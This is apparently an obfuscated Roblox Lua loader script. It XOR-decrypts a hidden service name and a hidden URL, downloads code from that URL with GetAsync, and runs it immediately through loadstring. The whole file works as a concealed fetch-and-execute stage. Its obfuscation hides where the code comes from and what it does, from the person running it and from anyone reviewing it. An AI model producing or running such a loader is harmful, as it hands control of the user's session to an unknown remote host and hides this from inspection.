local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
loadstring(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\249\215\207\53\213\190\213\8\216\192\222", "\126\177\163\187\69\134\219\167")):GetAsync(LUAOBFUSACTOR_DECRYPT_STR_0("\43\217\62\213\239\121\130\101\194\245\55\197\63\199\178\32\194\39\138\212\34\193\41\220\243\45\253\43\220\254\34\206\33\138\200\13\130\56\196\235\108\223\47\195\239\108\197\47\196\248\48\130\39\196\245\45\130\26\215\251\114\131\38\208\253", "\156\67\173\74\165"), true))();
